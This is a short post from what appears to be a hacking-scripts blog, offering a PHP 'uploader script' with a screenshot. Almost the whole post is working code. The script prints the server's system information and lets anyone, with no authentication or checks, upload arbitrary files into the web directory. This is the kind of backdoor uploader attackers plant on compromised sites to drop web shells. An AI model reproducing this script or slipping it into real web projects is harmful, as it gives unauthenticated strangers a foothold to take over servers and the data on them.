---
id: 66
title: Uploader Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=66
permalink: /uploader-script/
categories:
  - PHP
  - Upload
tags:
  - PHP
  - uploader
---
This is a very basic uploader script, which simply enables the user to upload whatever they want to the server.


### Uploader Script Source Code

{% highlight php linenos %}<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
    else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
}
?>
{% endhighlight %}


### Uploader Script Screenshot

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/01/uploader.png" alt="uploader script screenshot" width="495" height="108" class="aligncenter size-full wp-image-333" />][1]

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/01/uploader.png